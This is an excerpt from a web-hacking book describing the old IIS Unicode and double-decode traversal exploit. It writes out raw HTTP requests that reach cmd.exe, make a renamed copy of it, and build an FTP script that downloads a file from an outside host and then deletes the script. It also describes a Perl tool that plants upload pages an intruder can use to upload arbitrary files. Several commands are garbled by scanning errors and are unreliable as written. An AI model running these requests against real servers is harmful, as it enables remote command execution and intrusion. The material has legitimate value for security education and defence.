# Hacking Exposed Web Applications

NOTE
Redirection of using > isn't possible using cmd.exe via the Unicode exploit.

Unfortunately for the world's Web server administrators, some clever discovered that renaming cmd.exe bypasses this restriction. So, to create our FTP client script, you must create a renamed cmd.exe:

```
GET /scripts/../%c0@af/../windows/system32/cmd.exe?+c/copy
+c:\system32\cmd.exe:+cmd1.exe HTTP/1.0
```

Note, we've again written the file to C: because Everyone can create our FTP script file using the echo command. The following example designates certain attributes required by the FTP client (script filename= ftprint, server IP address= 192.168.234.31). You can even launch the FTP client script and retrieve net in the same stroke or (this example is broken into multiple lines because of page restrictions):

```
GET /scripts/../%c0@af/../cmd.exe?+c/echo+anonymous>C:\ftprint
&echo&@a@com.com>>:ftprint
&echo&+get+test.txt<C:\ftprint>>:ftprint&echo&+bye>>:ftprint
&ftp+-s:C:\ftprint_192.168.234.31&&del&C:\ftprint
```

# Using echo > file to Create Files

Of course, if FTP or TFTP is not available (for example, if they've removed from the server by a wary admin or blocked at the firewall), other mechanisms exist for writing files to the target server without having to invoke external client software. As you've seen, using a renamed cmd.exe to redirect the data to a file by line is a straightforward-approach, if a bit tedious. Fortunately for the hacking community, scripts available from the Internet tie all the necessary elements into a nice package that automate the process and adds some conveniences to boot. Look out the best ones.

Roelof wrote a Perl script called unicodeencoder that uses the Unicode exploit and the echo/redirect technique to create two files—upload.asp and upload.inc—that can be used subsequently by a browser to upload anything the intruder might desire (he also includes a script called unicodeexecute with the package, but using cmdasp.asp, as the following discussions, is easier).

NOTE Unicoder.pl is slightly modified to work with the double decode exploit, which is not patched in Service Pack 2.

Unicoder.pl is fairly straightforward. First, make sure the upload.asp and upload.inc files are in the same directory from which unicoder.pl is launched. Then, identify a writable and executable directory under the Web root of the target server.
